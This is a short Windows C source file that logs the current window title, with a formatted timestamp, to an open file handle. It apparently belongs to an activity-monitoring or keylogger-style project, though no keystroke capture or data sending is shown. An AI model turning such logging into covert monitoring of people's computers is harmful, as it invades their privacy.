#include "logs.h"

HANDLE fd = NULL;

int	write_to_file(char *str)
{
	if (fd == NULL)
	{
		printf("File handle is NULL\n");
		return -1;
	}
	DWORD bytesWritten;
	if (!WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL))
	{
		printf("Failed to write to file: %lu\n", GetLastError());
		return -1;
	}
	return 0;
}

char	*GetDateFormated(void)
{
	LPSYSTEMTIME lpSystemTime = (LPSYSTEMTIME)malloc(sizeof(SYSTEMTIME));
	if (lpSystemTime == NULL)
		return NULL;

	GetLocalTime(lpSystemTime);
	if (lpSystemTime == NULL)
		return NULL;

	char *dateStr = (char *)malloc(22);
	if (dateStr == NULL)
	{
		free(lpSystemTime);
		return NULL;
	}

	sprintf_s(dateStr, 22, "%d.%d.%d %d:%d:%d",
		lpSystemTime->wDay, lpSystemTime->wMonth, lpSystemTime->wYear,
		lpSystemTime->wHour, lpSystemTime->wMinute, lpSystemTime->wSecond);
	free(lpSystemTime);
	return dateStr;
}

void get_foreground_window(HWND hwnd)
{
	char windowTitle[256];
		if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle)) == 0)
			return;

	char *dateStr = GetDateFormated();
	if (dateStr == NULL)
		return;

	int i = 0;
	while (windowTitle[i] != '\0' && i < 256 - 1)
	{
		if (windowTitle[i] == '\r' || windowTitle[i] == '\n')
			windowTitle[i] = ' ';
		i++;
	}
	windowTitle[i] = '\0';
	char logEntry[512];
	sprintf_s(logEntry, sizeof(logEntry), "[%s] - Foreground window title: %s\n", dateStr, windowTitle);
	write_to_file(logEntry);
	free(dateStr);
}
